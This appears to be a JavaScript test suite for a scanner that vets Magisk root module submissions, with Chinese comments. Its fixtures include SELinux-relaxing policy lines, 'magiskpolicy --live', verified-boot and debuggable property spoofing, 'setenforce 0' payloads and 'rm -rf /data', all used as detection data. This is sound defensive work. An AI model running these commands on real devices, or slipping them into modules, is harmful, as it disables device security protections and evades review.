    assert.ok(r.findings.some((f) => f.ruleId === ruleId), JSON.stringify(r.findings.map((f) => f.ruleId)));
    assert.notEqual(r.riskLevel, 'low', '这四类都不许停在 low —— 之前是 low → auto-approve');
  });
}

test('sepolicy.rule 只加 deny/auditallow 不命中 RELAX；resetprop 改自有键不命中', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.t2b', files: [['module.prop', moduleProp('eval.t2b')],
    ['sepolicy.rule', 'deny magisk magisk:process *;\n'],
    ['service.sh', 'resetprop ro.my.mod.thing ok\n']] }));
  assert.equal(r.riskLevel, 'low');
});

// —— 反例的加强版：注释、echo 说明、变量名、getprop 只读，四种合法写法都不许命中 ——
const ROOT_SAFE_MODULE = [
  ['sepolicy.rule', [
    '# 本模块不给任何域开执行权限，下面全是收紧与抑制日志的写法：',
    'dontaudit su * fs:file { read write };',
    'auditallow magisk magisk:process *;',
    'allow magisk magisk:file { read write create getattr };',
    'allow untrusted_app system_file:file { read write open getattr };',
  ].join('\n')],
];

test('SELINUX_POLICY_RELAX：命中矩阵（10 命中 / 12 不命中，含注释与字符串常量）', () => {
  const hit = [
    'allow su * fs:file { read write open execute };',
    'allow su u:r:magisk:s0 fs:file { read write open execute };',
    'allow magisk daemons:process { transition noatsecure execute }',
    'allow su * * { * };',
    '  allow untrusted_app system_file:file { execute };',
    'allow su fs:file { read write setattr };',
    'allow appdomain magisk_data:file { read execute_no_trans };',
    'allow init * magisk:process { fork execmem };',
    'allow su shell:process { create setattr getattr };',
    'allow xyz abc:def { execute } ; # 行尾还有说明',
  ];
  const safe = [
    'deny magisk magisk:process *;',
    'dontaudit su * fs:file { read write };',
    'auditallow magisk magisk:process *;',
    'typepermissive su;',
    '# allow su * fs:file { execute };',
    '   # 注释：allow su * * { execute } 只是说明文字',
    'allow magisk magisk:file { read write create getattr }',
    'allow su shell:process transition;',
    'SELINUX_ALLOW="allow su * fs:file { execute }"',
    'echo "allow su * fs:file { execute }"',
    'allow su * fs:file { };',
    'genfscon magiskfs /data/adb/magisk u:object_r:magisk_file:s0',
  ];
  assert.equal(hit.length + safe.length, 22);
  for (const line of hit) assertHit('SELINUX_POLICY_RELAX', line, line);
  for (const line of safe) assertNoHit('SELINUX_POLICY_RELAX', line, line);
  // 证据字段形状与既有规则一致（file/line/snippet/message/advice 都在）
  const [f] = hits('SELINUX_POLICY_RELAX', '# 注释\nallow su * fs:file { execute };');
  assert.equal(f.line, 2, '行号是 sepolicy.rule 的行号');
  assert.equal(f.file, 'customize.sh');
  assert.match(f.message, /放宽 SELinux 策略/);
  assert.ok(f.advice && f.snippet);
});

test('MAGISK_POLICY_LIVE：命中矩阵（8 命中 / 6 不命中）', () => {
  const hit = [
    'magiskpolicy --live "allow su * *"',
    'magiskpolicy --live --output precompiled_sepolicy',
    'su -c \'magiskpolicy --live "allow init * *"\'',
    '  supolicy --live "allow magisk su:process *";',
    'busybox sh -c \'magiskpolicy --live "allow su * fs:file { execute }"\'',
    'magiskpolicy --live "allow zygote system_file:dir { search write }" && magiskpolicy --live "allow su * *"',
    'echo "$(magiskpolicy --live allow su * *)"',
    'log_and_patch() { magiskpolicy --live "allow su * *" }',
  ];
  const safe = [
    '# magiskpolicy --live "allow su * *"',
    'magiskpolicy --stdin < sepolicy.rule',
    'echo "usage: magiskpolicy --live is not used here"',
    'echo "log: magiskpolicy --live 未使用"',
    'ui_print "本模块不调用 supolicy --live"',
    'MAGISK_POLICY_LIVE_DESCR="supolicy 已废弃"',
  ];
  assert.equal(hit.length + safe.length, 14);
  for (const line of hit) assertHit('MAGISK_POLICY_LIVE', line, line);
  for (const line of safe) assertNoHit('MAGISK_POLICY_LIVE', line, line);
});

test('VERIFIED_BOOT_SPOOF：命中矩阵（8 命中 / 8 不命中，getprop 只读与 echo 说明不命中）', () => {
  const hit = [
    'resetprop -w ro.boot.verifiedbootstate green',
    'resetprop ro.boot.verifiedbootstate green',
    'setprop ro.boot.flash.locked 0',
    'resetprop --delete ro.boot.vbmeta.device_state',
    'su -c "resetprop -n ro.boot.veritymode enforcing"',
    'resetprop ro.my.thing a && resetprop -w ro.boot.verifiedbootstate green',
    'echo "$(resetprop -w ro.boot.verifiedbootstate green)"',
    'echo "resetprop -w ro.boot.verifiedbootstate green" > /data/adb/s.sh',
  ];
  const safe = [
    '# resetprop -w ro.boot.verifiedbootstate green',
    'getprop ro.boot.verifiedbootstate',
    'echo "resetprop -w ro.boot.verifiedbootstate green"',
    'ui_print "- 本模块不会改 ro.boot.verifiedbootstate"',
    'resetprop ro.my.mod.thing ok',
    'PROP_RO_BOOT_VERIFIEDBOOTSTATE=green',
    'ro.boot.verifiedbootstate=green',
    'setprop ro.product.model Pixel',
  ];
  assert.equal(hit.length + safe.length, 16);
  for (const line of hit) assertHit('VERIFIED_BOOT_SPOOF', line, line);
  for (const line of safe) assertNoHit('VERIFIED_BOOT_SPOOF', line, line);
});

test('DEBUGGABLE_ENABLE：命中矩阵（6 命中 / 9 不命中，值走变量或只读不命中）', () => {
  const hit = [
    'resetprop -w ro.debuggable 1',
    'setprop ro.secure 0',
    'resetprop ro.debuggable=1',
    'su -c "resetprop -n ro.secure 0"',
    'resetprop -w ro.secure 0  # 说明写在行尾',
    'echo "$(resetprop ro.debuggable 1)"',
  ];
  const safe = [
    '# resetprop -w ro.debuggable 1',
    'getprop ro.debuggable',
    'resetprop ro.debuggable',
    'resetprop -w ro.debuggable $VALUE',
    'echo "setprop ro.secure 0"',
    'echo "setprop ro.secure 0 (debug only)"',
    'resetprop ro.mydebuggable 1',
    'setprop ro.build.version.security_patch 2021-01-05',
    'ro.debuggable=1',
  ];
  assert.equal(hit.length + safe.length, 15);
  for (const line of hit) assertHit('DEBUGGABLE_ENABLE', line, line);
  for (const line of safe) assertNoHit('DEBUGGABLE_ENABLE', line, line);
  assert.equal(assertHit('DEBUGGABLE_ENABLE', 'resetprop -w ro.debuggable 1')[0].severity, 'medium',
    'DEBUGGABLE_ENABLE 是 medium —— 不是 high');
});

test('PROP_BOOT_SPOOF（评审 F4）：.prop 直写键名命中；注释与描述文字不命中', () => {
  const hit = [
    'ro.boot.verifiedbootstate=green',
    'ro.boot.vbmeta.device_state=unlocked',
    'ro.boot.flash.locked=0',
    '  ro.boot.veritymode=enforcing',
  ];
  const safe = [
    '#ro.boot.verifiedbootstate=green',
    '# ro.boot.flash.locked=0',
    'getprop ro.boot.verifiedbootstate',
    'description=ro.boot.verifiedbootstate=green 这个模块不上锁',
    'ro.debuggable=1',
    'ro.boot.verifiedbootstatex=green',
  ];
  assert.equal(hit.length + safe.length, 10);
  for (const line of hit) assertHit('PROP_BOOT_SPOOF', line, line);
  for (const line of safe) assertNoHit('PROP_BOOT_SPOOF', line, line);
  // F4 的实测原句：这条通道以前一条规则都不咬
  const fs = scanContent('system.prop', 'ro.boot.verifiedbootstate=green\nro.debuggable=1\nro.secure=0',
    [PROP_BOOT_SPOOF]);
  assert.equal(fs.length, 1, '四个 boot 键里只有 verifiedbootstate 命中（本规则只管 boot 家族；'
    + '另两行由 fix3-P9 的 PROP_SECURITY_WEAKEN 兜住，见「fix3-P9：新规则接进规则表」那条）');
  assert.equal(fs[0].line, 1);
  assert.equal(fs[0].severity, 'high', '已拍定 2026-10-13：纳入，severity high');
});

test('F4 端到端：只在 system.prop 里写 boot 状态的模块不再被判 low', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.t2c',
    files: [['module.prop', moduleProp('eval.t2c')], ['system.prop', 'ro.boot.verifiedbootstate=green\n']] }));
  assert.ok(r.findings.some((f) => f.ruleId === 'PROP_BOOT_SPOOF'), JSON.stringify(r.findings));
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block', 'high 只可能是不自动合入（block），不是拒绝投稿');
});

// —— 扫描面：sepolicy.rule / *.rc / *.te / 有 shebang 的无后缀条目 ——

test('classify：sepolicy.rule / .rc / .te / 有 shebang 的无后缀条目进扫描面，后缀相同的伪装二进制仍归 binaries', () => {
  const mk = (name, content) => ({ name, content, size: content.length, head: Buffer.from(content, 'utf8') });
  const c = classify([
    mk('sepolicy.rule', 'allow su * fs:file { execute };\n'),
    mk('common/service.rc', 'service myd /system/bin/sh $MODDIR/run.sh\n'),
    mk('sepolicy.te', 'allow magisk magisk:process { execute };\n'),
    mk('post-fs-data', '#!/system/bin/sh\nresetprop -w ro.debuggable 1\n'),
    mk('NOTICE', 'plain text, no shebang\n'),
    mk('evil/sepolicy.rule', '\u0000\u0000\u0000 allow su * * { * }'),
  ]);
  assert.deepEqual(c.policy.map((f) => f.name), ['sepolicy.rule', 'common/service.rc', 'sepolicy.te'],
    '三类「会被策略引擎/init 真读」的文件进 policy 桶');
  assert.deepEqual(c.otherScripts.map((f) => f.name), ['post-fs-data'],
    '无后缀但首行 shebang 的条目按脚本纳入（post-fs-data 不带 .sh 不再免检）');
  assert.deepEqual(c.others.map((f) => f.name), ['NOTICE'], '无后缀又没 shebang 的纯文本仍然不进扫描面');
  assert.deepEqual(c.binaries.map((f) => f.name), ['evil/sepolicy.rule'],
    '魔数判定先于后缀：改名成 sepolicy.rule 的机器码照样落到 binaries');
});

test('hasShebang 只认头两字节的 #!，不看整段内容也不整读', () => {
  assert.equal(hasShebang(Buffer.from('#!/system/bin/sh\n', 'utf8')), true);
  assert.equal(hasShebang(Buffer.from('#!/system/bin/sh', 'utf8')), true);
  assert.equal(hasShebang(Buffer.from('# comment\n#!/x\n', 'utf8')), false, '第二行的 #! 不算 shebang');
  assert.equal(hasShebang(Buffer.from('#', 'utf8')), false, '只有一个字节不能越界读');
  assert.equal(hasShebang(Buffer.from('\u0000#!/x', 'utf8')), false);
  assert.equal(hasShebang(undefined), false);
});

test('端到端：sepolicy.rule 的命中带着文件与行号进报告，且 Markdown 有「root 提权语义」这一节', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.t2d', files: [
    ['module.prop', moduleProp('eval.t2d')],
    ['sepolicy.rule', '# 说明\nallow su u:r:magisk:s0 fs:file { read execute };\n'],
  ] }));
  const f = r.findings.find((x) => x.ruleId === 'SELINUX_POLICY_RELAX');
  assert.ok(f, JSON.stringify(r.findings.map((x) => x.ruleId)));
  assert.equal(f.file, 'sepolicy.rule');
  assert.equal(f.line, 2, '注释行不进命中，行号是第 2 行');
  assert.equal(f.category, 'root');
  assert.equal(f.severity, 'high');
  const md = renderMarkdown(r);
  assert.match(md, /### root 提权语义/);
  assert.match(md, /sepolicy\.rule/, '文件清单里要看得见 sepolicy.rule');
  assert.ok(r.scripts.some((s) => s.name === 'sepolicy.rule'), '全文内嵌也要有它，否则人工复核看不到');
  assert.ok(r.inventory.policyFiles.some((s) => s.name === 'sepolicy.rule'), JSON.stringify(r.inventory));
});

test('端到端：有 shebang 的无后缀 post-fs-data 里的 --live 不再免检', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.t2e', files: [
    ['module.prop', moduleProp('eval.t2e')],
    ['post-fs-data', '#!/system/bin/sh\nmagiskpolicy --live "allow su * *"\n'],
  ] }));
  assert.ok(r.findings.some((f) => f.ruleId === 'MAGISK_POLICY_LIVE'), JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.equal(r.riskLevel, 'high');
});

// —— 接线与定级 ——

test('root 五条规则都接进 CONTENT_RULES，分类/级别与简报一致且参与定级', () => {
  const expect = [
    ['SELINUX_POLICY_RELAX', 'high'], ['MAGISK_POLICY_LIVE', 'high'], ['VERIFIED_BOOT_SPOOF', 'high'],
    ['DEBUGGABLE_ENABLE', 'medium'], ['PROP_BOOT_SPOOF', 'high'],
  ];
  for (const [id, sev] of expect) {
    assert.ok(CONTENT_RULES.some((r) => r.id === id), `${id} 不进 CONTENT_RULES 的话 scanContent 根本不会跑它`);
    const rule = RULES_BY_ID[id];
    assert.equal(rule.category, 'root', `${id} 的分类`);
    assert.equal(rule.severity, sev, `${id} 的 severity`);
    assert.ok(rule.title && rule.advice, `${id} 缺 title/advice`);
    const finding = rule.scan('service.sh', 'x').length ? rule.scan('service.sh', 'x')[0] : null;
    assert.ok(finding === null || countsTowardRisk(finding), `${id} 不许出现 info 级`);
  }
  assert.equal(SEVERITY_ORDER[RULES_BY_ID.DEBUGGABLE_ENABLE.severity], 2, 'medium 是 2 档');
});

test('每条规则的 category 都在 CATEGORY_LABEL 里有标题（报告分组不许出现空标题）', () => {
  const cats = new Set(CONTENT_RULES.map((r) => r.category));
  for (const c of cats) assert.ok(CATEGORY_LABEL[c], `分类 ${c} 没有中文标题`);
  assert.equal(CATEGORY_LABEL.root, 'root 提权语义');
});

test('误伤哨兵：一个正经模块（注释 sepolicy.rule + .rc 服务定义 + 只读 getprop + echo 说明）仍然判 low 并自动放行', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.t2legit', files: [
    ['module.prop', moduleProp('eval.t2legit')],
    ['customize.sh', '#!/system/bin/sh\nui_print "- installing"\ncp -f busybox $MODPATH/system/xbin/bb\nrm -rf $MODDIR/cache\n'],
    ['service.sh', [
      '#!/system/bin/sh',
      'MODDIR=${0%/*}',
      'getprop ro.boot.verifiedbootstate',
      'echo "本模块只调整音量，不会 resetprop ro.boot.verifiedbootstate green"',
      'echo "也不会 setprop ro.secure 0"',
      'while [ ! -f /data/adb/magisk/magisk ]; do sleep 1; done',
    ].join('\n') + '\n'],
    ['sepolicy.rule', ROOT_SAFE_MODULE[0][1]],
    ['system.prop', 'ro.my.mod.enabled=1\n'],
    ['common/service.rc', 'service mydaemon /system/bin/sh /data/adb/modules/eval.t2legit/daemon.sh\nclass late_start\n'],
    ['daemon.sh', '#!/system/bin/sh\nlog_msg "started"\n'],
  ] }), { changeType: 'first' });
  const rootHits = r.findings.filter((f) => f.category === 'root');
  assert.deepEqual(rootHits.map((f) => `${f.ruleId}@${f.file}:${f.line}`), [],
    'root 规则在正经模块上一条都不许命中：' + JSON.stringify(rootHits));
  assert.equal(r.riskLevel, 'low', JSON.stringify(r.findings));
  assert.equal(r.decision.action, 'auto-approve');
  assert.ok(r.scripts.some((s) => s.name === 'sepolicy.rule') && r.scripts.some((s) => s.name === 'common/service.rc'),
    '不进扫描面的话「没命中」只是因为没看，所以这里必须证明它确实被读过');
});




// ---------------------------------------------------------------------------
// ⑨ 第二轮修复（fix2）：P1 引用语法 / P2 变量间接 fail-closed / P3 运行期覆写 /
//    P4 死分支与规则文本一致性 / P5 桶与分类守卫 / P6 注释豁免边界
// ---------------------------------------------------------------------------

// —— P1：EXEC_BUNDLED_FILE 语法补洞 ——
// 评审实测（fix2 开工前逐条跑过）：下面 6 行在旧语法下全部 0 findings → low → auto-approve。

test('fix2-P1：exec/setsid/trap 引号命令串/子 shell/无空白 sh —— 动词式引用必须被检出', () => {
  for (const line of [
    'exec $MODDIR/x.bin',
    'setsid $MODDIR/x.bin',
    'trap "sh $MODDIR/x" EXIT',
    '(sh $MODDIR/x.bin)',
    'sh"$MODDIR/x"',
    'exec "${MODDIR}/clean" && exit 0',
    'nohup $MODDIR/helper &',
  ]) {
    assert.ok(EXEC_BUNDLED_FILE.scan('service.sh', line).length > 0, 'EXEC_BUNDLED_FILE 未检出: ' + line);
  }
});

test('fix2-P1：解释器动词 + 裸 $VAR 与 for-glob + do $VAR 必须被检出（EXEC_INDIRECT）', () => {
  for (const line of [
    'sh $X',
    'bash ${X}',
    'for f in $MODDIR/*.bin; do $f; done',
    'trap "exec $X" EXIT',
  ]) {
    assert.ok(EXEC_INDIRECT.scan('service.sh', line).length > 0, 'EXEC_INDIRECT 未检出: ' + line);
  }
  // 假阳性边界：迭代子与模块目录无关的常规循环不许牵动（不许反向扩成「整行含 $MODDIR 就亮」）
  assert.equal(EXEC_INDIRECT.scan('service.sh', 'for f in a b; do $f; done').length, 0);
  // 模块目录前缀变量本身由 EXEC_BUNDLED_FILE 负责，不重复算间接
  assert.equal(EXEC_INDIRECT.scan('service.sh', 'sh "$MODDIR/install.sh"').length, 0);
});

test('fix2-P1 端到端：六条实测曾 auto-approve 的形态全部转人工', async () => {
  for (const line of [
    'exec $MODDIR/x.bin',
    'setsid $MODDIR/x.bin',
    'trap "sh $MODDIR/x" EXIT',
    '(sh $MODDIR/x.bin)',
    'sh"$MODDIR/x"',
    'for f in $MODDIR/*.bin; do $f; done',
  ]) {
    const zip = makeModuleZip({ id: 'eval.f2p1', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      ['x.bin', 'setenforce 0\n'],
      ['x', 'setenforce 0\n'],
    ] });
    const r = await scanToReport(zip, { changeType: 'first' });
    assert.equal(r.riskLevel, 'high', line + ' → ' + r.riskLevel + '/' + r.decision.action + '（旧语法实测 low/auto-approve）');
    assert.equal(r.decision.action, 'block', line);
  }
});

// —— P2：变量间接必须 fail closed ——

test('fix2-P2：钉得住的变量按包内条目解析升级；钉不住的按「未验证引用」报 high；指向包外的撤销', async () => {
  // (1) 钉得住：X 字面指向包内载荷 —— 必须解析成真实条目、进扫描面、逐行扫
  const pinnedZip = makeModuleZip({ id: 'eval.f2p2a', files: [
    ['service.sh', '#!/system/bin/sh\nX="$MODDIR/payload.bin"\nsh $X\n'],
    ['payload.bin', 'setenforce 0\n'],
  ] });
  const a = await scanToReport(pinnedZip, { changeType: 'first' });
  // Task 2.7（fix10-P11）：payload.bin 是可读文本，本来就在 feed 上，所以 escalated 空；
  // 「钉得住的变量要解析成包内条目并把它读掉」这条主张由 SELINUX_DISABLE + high + block 钉着。
  assert.ok(a.scripts.some((s) => s.name === 'payload.bin'),
    '变量钉到的条目必须在被逐行扫过的文件里：' + JSON.stringify(a.scripts.map((s) => s.name)));
  assert.deepEqual(a.escalated, [], 'payload.bin 已在 feed 上：不许记一笔没发生过的升级');
  assert.ok(a.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'payload.bin'),
    '读到了就要真扫：' + JSON.stringify(a.findings.map((f) => f.ruleId)));
  assert.equal(a.riskLevel, 'high');
  assert.equal(a.decision.action, 'block');

  // (2) 钉不住：扫描器无法确定 $X 指向哪 —— 报 high 并披露「没读过它」，不许悄悄放过
  const b = await scanToReport(makeModuleZip({ id: 'eval.f2p2b', files: [
    ['service.sh', '#!/system/bin/sh\nsh $X\n'],
  ] }), { changeType: 'first' });
  const fb = b.findings.find((x) => x.ruleId === 'EXEC_INDIRECT');
  assert.ok(fb, '钉不住的变量执行必须报：' + JSON.stringify(b.findings.map((x) => x.ruleId)));
  assert.equal(fb.severity, 'high');
  assert.equal(b.riskLevel, 'high', 'fail closed：钉不住 ≠ 干净');
  assert.equal(b.decision.action, 'block');
  assert.equal(fb.advice, EXEC_UNPINNED_ADVICE, '报告要写明这条引用没被验证，而不是承诺读过');
  assert.ok(!fb.advice.includes('读一遍'), '没读过的东西不许在建议里说「读一遍」');

  // (3) 变量钉到包外路径（系统二进制）：不是包内引用，撤销，别淹人工队列
  const c = await scanToReport(makeModuleZip({ id: 'eval.f2p2c', files: [
    ['service.sh', '#!/system/bin/sh\nSCRIPT=/system/bin/sh\nsh $SCRIPT -c id\n'],
  ] }), { changeType: 'first' });
  assert.ok(!c.findings.some((x) => x.ruleId === 'EXEC_INDIRECT'), JSON.stringify(c.findings.map((x) => x.ruleId)));
  assert.equal(c.riskLevel, 'low', JSON.stringify(c.findings));

  // (4) 变量钉到包内且该条目已在扫描面：与裸写路径同判（撤销），但必须是「解析过」的撤销
  const d = await scanToReport(makeModuleZip({ id: 'eval.f2p2d', files: [
    ['service.sh', '#!/system/bin/sh\nX="$MODDIR/helper.sh"\nsh $X\n'],
    ['helper.sh', 'echo ok\n'],
  ] }), { changeType: 'first' });
  assert.ok(!d.findings.some((x) => x.ruleId === 'EXEC_INDIRECT'), JSON.stringify(d.findings.map((x) => x.ruleId)));
  assert.equal(d.riskLevel, 'low');
});

// —— P3：名字在扫描面 ≠ 字节被证实 ——

test('fix2-P3：向模块目录写出/解包 + 执行同名条目必须升级（同名 ≠ 同字节）', async () => {
  const zip = makeModuleZip({ id: 'eval.f2p3', files: [
    ['customize.sh', '#!/system/bin/sh\nunzip -o /sdcard/x.zip -d $MODDIR\nsh $MODDIR/helper.sh\n'],
    ['helper.sh', 'echo benign\n'],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('MODDIR_RUNTIME_WRITE'), '写出/解包进模块目录本身要成为发现：' + JSON.stringify(ids));
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), '引用撤销判据在存在覆写证据时必须失效（旧行为实测 low/auto-approve）');
  const eb = r.findings.find((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.match(eb.snippet, /helper\.sh/, '报告要指名造成升级的那条引用');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');

  // 反向哨兵：没有写出证据的常规多脚本模块照旧撤销（不许把 P3 变成「凡引用皆 high」）
  const ok = await scanToReport(makeModuleZip({ id: 'eval.f2p3ok', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODDIR/install.sh\n'],
    ['install.sh', 'echo install\n'],
  ] }), { changeType: 'first' });
  assert.ok(!ok.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'), JSON.stringify(ok.findings.map((f) => f.ruleId)));
  assert.ok(!ok.findings.some((f) => f.ruleId === 'MODDIR_RUNTIME_WRITE'));
  assert.equal(ok.riskLevel, 'low');
  // fix8-E 改动此行（原为 'auto-approve'）：这条反向哨兵钉的是「没有覆写证据时撤销照旧」，
  // 上面两条断言仍在钉这件事，且 EXEC_BUNDLED_FILE 确实被撤掉了。
  // 但撤销一旦发生（这里是常规写法 sh $MODDIR/install.sh），E 就关掉自动通道 ——
  // 旧期望与本轮规格直接冲突，按规格改；代价落在决策上，不落进散文。
  assert.equal(ok.decision.action, 'request-review', '有撤销记录就不自动放行（fix8-E）');
  assert.deepEqual(ok.revokedBundledRefs.map((x) => x.resolvedEntry), ['install.sh'], JSON.stringify(ok.revokedBundledRefs));

  // 写出发现的证据字段要齐全
  const wr = r.findings.find((f) => f.ruleId === 'MODDIR_RUNTIME_WRITE');
  assert.equal(wr.file, 'customize.sh');
  assert.equal(wr.line, 2);
});

test('fix2-P3：A 文件解包覆写、B 文件执行同名条目 —— 引用不许按「已扫过」撤销', async () => {
  const zip = makeModuleZip({ id: 'eval.f2p3x', files: [
    ['service.sh', '#!/system/bin/sh\nunzip -o /sdcard/pack.zip -d ${MODDIR}/\n'],
    ['customize.sh', '#!/system/bin/sh\nsh $MODDIR/helper.sh\n'],
    ['helper.sh', 'echo benign\n'],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.equal(r.riskLevel, 'high', '跨文件覆写不许停在 low：' + JSON.stringify(r.findings.map((f) => f.ruleId)));
  const cross = r.findings.find((f) => f.file === 'customize.sh' && f.ruleId === 'MODDIR_RUNTIME_WRITE');
  assert.ok(cross, '必须有一条指名 customize.sh 的覆写升级发现：' + JSON.stringify(r.findings.filter((f) => f.category === 'execution')));
});

test('fix2-P3 报告错配：良性最左引用 + 解析不到的引用同行时，snippet 必须指名后者', async () => {
  const zip = makeModuleZip({ id: 'eval.f2p3b', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODDIR/install.sh && sh $MODDIR/ghost.dat\n'],
    ['install.sh', 'echo ok\n'],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
  assert.ok(f);
  assert.match(f.snippet, /ghost\.dat/,
    '旧行为实测 snippet 曾被写成 "sh $MODDIR/install.sh"（良性最左），报告指鹿为马');
  assert.ok(!/install\.sh/.test(f.snippet), '报告不许把没造成升级的引用写成风险本体');
});

// —— P4 ——

test('fix2-P4b：SELINUX_POLICY_RELAX 权限集里的 enforce 分支不许是死词', () => {
  // `enforceforce` 不是任何真实策略里存在的权限名（旧 pattern 里的死分支，评审点名）；
  // setenforce 才是 kernel:security 类里真实存在、且允许运行时关强制的权限。
  assertHit('SELINUX_POLICY_RELAX', 'allow init kernel:security { setenforce };');
  assertHit('SELINUX_POLICY_RELAX', 'allow su kernel:security { setenforce setbool };');
  // 反向：不含执行类权限的 allow 不命中（别把集合换成 . 通配）
  assertNoHit('SELINUX_POLICY_RELAX', 'allow init kernel:security { read };');
});

test('fix2-P4a：PROP_BOOT_SPOOF 只覆盖四个 ro.boot.* 完整性键 —— 规则文本与 pattern 同一个真相', () => {
  // 本快照里 title/message/advice 没有承诺 ro.*/persist.* 广覆盖（评审描述的失配在本仓不存在），
  // 这里把它钉成一致性锁：谁把文案改宽而 pattern 没跟着改宽，这条就红。
  const rule = RULES_BY_ID.PROP_BOOT_SPOOF;
  for (const txt of [rule.title, rule.advice]) {
    assert.ok(!/persist\./.test(txt), 'advice/title 不许承诺 persist.* 而 pattern 不覆盖：' + txt);
  }
  for (const line of [
    'ro.boot.verifiedbootstate=green', 'ro.boot.vbmeta.device_state=unlocked',
    'ro.boot.flash.locked=0', 'ro.boot.veritymode=enforcing',
  ]) assertHit('PROP_BOOT_SPOOF', line, line);
  // 明确不在本规则范围内的键（.prop 通道的已知缺口，报告如实披露，不许文案与行为分叉）
  for (const line of ['persist.sys.usb.config=adb', 'ro.secure=1', 'sys.usb.controller=adb_root']) {
    assertNoHit('PROP_BOOT_SPOOF', line, line);
  }
});

// —— P5 / P6：桶与分类守卫 ——

test('fix2-P5：classify 的桶集合与 scanZip 的扫描面桶必须一一对应（新桶不许静默消失）', () => {
  const p = writeZip('buckets.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: '#!/system/bin/sh\nexit 0\n' },           // canonical
    { name: 'extra/helper.sh', content: 'echo x\n' },                          // otherScripts
    { name: 'META-INF/com/google/android/updater-script', content: 'x\n' },    // handlers
    { name: 'system.prop', content: 'ro.x.y=1\n' },                            // props
    { name: 'sepolicy.rule', content: 'dontaudit su su:file read;\n' },        // policy
    { name: 'blob', content: Buffer.from('\x7fELF\x02\x01', 'latin1') },       // binaries
    { name: 'README.md', content: 'docs\n' },                                  // others
  ]);
  const files = readZip(p).files;
  const buckets = Object.keys(classify(files)).filter((k) => k !== 'propEntry');
  assert.deepEqual(buckets.sort(),
    [...SCAN_TARGET_BUCKETS, 'binaries', 'others'].sort(),
    'classify 新增了桶而 scanZip 没接：这就是 P5 复现过的静默消失');
  const r = scanZip(p, { changeType: 'first' });
  // 每一个扫描面桶都要同时出现在 inventory、scripts 与 Markdown 文件清单里
  const invKeys = { canonical: 'canonicalScripts', otherScripts: 'otherScripts', handlers: 'handlers', props: 'props', policy: 'policyFiles' };
  const md = renderMarkdown(r);
  for (const b of SCAN_TARGET_BUCKETS) {
    const c = classify(files)[b];
    assert.ok(c.length, `夹具必须让桶 ${b} 非空，否则这条守卫是空转`);
    const rows = r.inventory[invKeys[b]];
    assert.ok(rows && rows.length === c.length, `inventory.${invKeys[b]} 少了 ${b} 桶的条目`);
    for (const f of c) {
      assert.ok(r.scripts.some((s) => s.name === f.name), `${f.name}（桶 ${b}）必须进 report.scripts`);
      assert.ok(md.includes(f.name), `${f.name}（桶 ${b}）必须出现在 Markdown 清单里`);
    }
  }
});

test('fix2-P5：分类未识别的 finding 必须在 Markdown 里显式披露，不许渲染成没人看得见的分组', () => {
  const p = writeZip('unknowncat.zip', [{ name: 'module.prop', content: CLEAN_PROP }]);
  const r = scanZip(p, { changeType: 'first' });
  r.findings = [{ ruleId: 'SOMETHING_NEW', category: 'quantum', severity: 'high', file: 'x.sh', line: 1,
    snippet: 'x', message: 'm', advice: 'a' }];
  const md = renderMarkdown(r);
  assert.match(md, /分类未识别[：:] ?quantum/, '未知分类至少要写明「分类未识别」，这是 P5 那类白名单遗忘的最后防线');
});

test('fix2-P6：豁免只认整行注释 —— 行尾 # 的 sepolicy 授权照报（.te 没有 # 语法）', () => {
  // 命中的行尾注释形状（magiskpolicy 会原样应用这行）
  assertHit('SELINUX_POLICY_RELAX', 'allow su * fs:file { execute } # comment');
  // 整行注释豁免维持既有先例（不许反向扩大成「行内含 # 就豁免」）
  assertNoHit('SELINUX_POLICY_RELAX', '# allow su * fs:file { execute }');
  assertNoHit('MAGISK_POLICY_LIVE', '# magiskpolicy --live "allow su * *"');
  assertHit('MAGISK_POLICY_LIVE', 'magiskpolicy --live "allow su * *" # 行尾说明');
});

test('fix2-P6：inventory.policyFiles 不是死字段 —— Markdown 清单要渲染出策略文件行', () => {
  const r = scanZip(writeZip('polinv.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'sepolicy.rule', content: 'dontaudit su su:file read;\n' },
  ]), { changeType: 'first' });
  assert.ok(r.inventory.policyFiles.some((f) => f.name === 'sepolicy.rule'));
  assert.match(renderMarkdown(r), /策略\/初始化文件[^\n]*sepolicy\.rule/);
});

// ---------------------------------------------------------------------------
// ⑩ 第三轮修复（fix3）：P7 行工厂看全部匹配 / P8 permissive / P9 .prop 直写削弱安全键
// ---------------------------------------------------------------------------
//
// 评审在 cd79136 的规则表上逐条实测（单行输入），四条同根因：
//   echo "resetprop -w ro.boot.verifiedbootstate green"; resetprop -w ro.boot.verifiedbootstate green -> 0 hits
//   echo "magiskpolicy --live"; magiskpolicy --live "allow su * fs:file { execute_no_trans }"         -> 0 hits
//   rm -rf "$TMP_PATH"; rm -rf /data                                                                  -> medium（裸 /data 是 high）
//   resetprop -w ro.boot.verifiedbootstate green                                                      -> high（基数必须仍是 1）
// 根因：makeLineRule.scan 只取一行里**第一个**匹配，再拿这一个匹配去判豁免与定档 ——
// 于是「写在前面的那半行」决定后面真载荷要不要被看一眼。审批闸里的 fail-open：
// 前置一句 echo 说明就能让所有 root 语义规则闭嘴，包判 low，decide() 自动合入。

